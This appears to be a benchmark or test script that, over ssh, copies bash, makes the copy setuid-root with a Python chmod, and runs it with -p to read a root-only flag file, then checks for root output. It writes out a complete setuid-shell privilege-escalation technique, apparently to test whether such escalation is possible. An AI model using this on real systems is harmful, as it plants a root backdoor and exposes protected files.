#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cp /bin/bash /opt/bench/fsetid-bin
/usr/bin/python3 -c "import os; os.chmod(\"/opt/bench/fsetid-bin\", 0o4755)"
/opt/bench/fsetid-bin -p -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
